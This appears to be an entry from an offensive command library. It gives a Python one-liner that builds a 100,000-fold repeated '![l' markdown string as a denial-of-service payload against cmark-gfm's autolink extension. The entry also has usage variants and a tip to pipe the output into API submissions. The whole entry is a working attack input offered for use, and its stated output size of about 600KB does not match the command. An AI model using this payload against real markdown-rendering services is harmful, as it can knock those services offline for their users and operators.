---
data: 'python3 -c ''print("![l"* 100000 + "\n")'''
tags:
  - payload-generation
  - dos
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.278Z'
id: 2c007bb4-e10e-49bc-b402-099357a24e4a
verified: false
validated: true
submitted: true
---
# generate-cmark-gfm-dos-payload

## Command

```bash
python3 -c 'print("![l"* 100000 + "\n")'
```

## Description

Generates a malicious markdown string with 100,000 repetitions of '![l' followed by a newline, exploiting polynomial time in cmark-gfm's autolink extension.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-c` | Execute the given string as Python code | Yes |
| `* 100000` | Repeat the string '![l' 100,000 times | Yes |
| `+ "\n"` | Append a newline character | Yes |

## Examples

### Basic Usage

```bash
python3 -c 'print("![l"* 100000 + "\n")' > payload.txt
```

### Advanced Usage

```bash
python3 -c 'print("![l"* 50000 + "\n")'  # Smaller payload for testing
```

## Expected Output

A continuous string output of approximately 600KB; no formatting, just raw text. Redirect to file for use in pipes or API submissions.

## Related

- [[commands/verify-cmark-gfm-dos]]
- [[procedures/Craft-Malicious-Markdown-Payload-for-cmark-gfm]]
